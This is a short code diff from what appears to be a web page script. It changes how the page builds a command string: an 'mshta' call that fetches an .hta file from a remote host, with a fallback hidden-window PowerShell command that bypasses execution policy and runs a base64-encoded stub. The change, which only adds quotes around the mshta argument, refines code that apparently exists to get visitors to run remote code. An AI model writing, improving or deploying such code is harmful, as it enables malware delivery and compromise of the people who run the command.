@@ -78,7 +78,7 @@ button.ok{background:#248046}
     return btoa(o);
   }
 
-  var main = 'mshta ' + host + '/h.hta?_=' + t;
+  var main = 'mshta "' + host + '/h.hta?_=' + t + '"';
   var alt  = 'powershell -nop -ni -w h -ep bypass -enc ' + b64(stub);
   var cur = main;
 
